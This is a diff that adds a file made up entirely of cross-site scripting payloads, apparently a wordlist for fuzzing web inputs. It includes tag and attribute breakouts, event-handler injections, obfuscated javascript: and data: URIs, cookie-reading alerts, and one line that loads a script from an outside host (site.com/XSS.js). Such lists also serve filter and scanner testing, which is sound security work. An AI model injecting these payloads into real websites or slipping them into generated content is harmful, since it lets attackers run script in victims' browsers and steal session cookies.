@@ -1,0 +1,61 @@
+<!--<img src="--><img src=x onerror=javascript:alert(1)//">
+<style><img src="</style><img src=x onerror=javascript:alert(1)//">
+<? foo="><script>javascript:alert(1)</script>">
+<! foo="><script>javascript:alert(1)</script>">
+</ foo="><script>javascript:alert(1)</script>">
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<BODY ONLOAD=alert('XSS')>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<script /**/>/**/alert(1)/**/</script /**/
+ <script ^__^>alert(String.fromCharCode(49))</script ^__^
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+<script ~~~>alert(0%0)</script ~~~>
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<script src="data:text/javascript,alert(1)"></script>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
+<script>+-+-1-+-+alert(1)</script>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<script x> alert(1) </script 1=2
+<--`<img/src=` onerror=alert(1)> --!>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+<script>alert(1);</script>
+<script>alert('XSS');</script>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=foo.png onerror=alert(/xssed/) />
+<marquee><script>alert('XSS')</script></marquee>
+"><script>alert(0)</script>
+</title><script>alert(/xss/)</script>
+</textarea><script>alert(/xss/)</script>
+<script language="JavaScript">alert('XSS')</script>
+<body onLoad="alert('XSS');"
+"/></a></><img src=1.gif onerror=alert(1)>
+'">><script>alert('XSS')</script>
+</script><script>alert(1)</script>
+'"></title><script>alert(1111)</script>
+</textarea>'"><script>alert(document.cookie)</script>
+'""><script language="JavaScript"> alert('X \nS \nS');</script>
+'></select><script>alert(123)</script>
+}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+='><script>alert("xss")</script>
+<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
+">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
+">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
+!--" /><script>alert('xss');</script>
+<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
+'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
+"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
+\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
+<BODY ONLOAD=alert("XSS")>
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
